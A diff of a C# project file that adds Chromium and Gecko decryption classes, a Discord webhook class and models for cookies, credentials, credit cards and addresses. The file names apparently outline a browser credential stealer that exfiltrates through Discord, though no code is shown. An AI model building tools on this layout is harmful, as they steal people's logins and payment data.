@@ -55,17 +55,20 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="AES\AesGcm256.cs" />
+    <Compile Include="Encryption\ChromiumDecryption.cs" />
     <Compile Include="Browser\BrowserManager.cs" />
     <Compile Include="Browser\BrowserModel.cs" />
-    <Compile Include="Browser\Util.cs" />
+    <Compile Include="Browser\ChromiumUtil.cs" />
     <Compile Include="Class1.cs" />
     <Compile Include="Discord\Webhook.cs" />
+    <Compile Include="Browser\GeckoBrowserManager.cs" />
+    <Compile Include="Encryption\GeckoDecryption.cs" />
+    <Compile Include="Manager\GeckoManager.cs" />
     <Compile Include="Model\ColumnModel.cs" />
     <Compile Include="Model\CookieModel.cs" />
     <Compile Include="Model\CredentialModel.cs" />
     <Compile Include="Filesaver\FileManager.cs" />
-    <Compile Include="Manager\GenericManager.cs" />
+    <Compile Include="Manager\ChromiumManager.cs" />
     <Compile Include="Model\AddressesModel.cs" />
     <Compile Include="Model\CreditCardModel.cs" />
     <Compile Include="Model\SqliteTableModel.cs" />
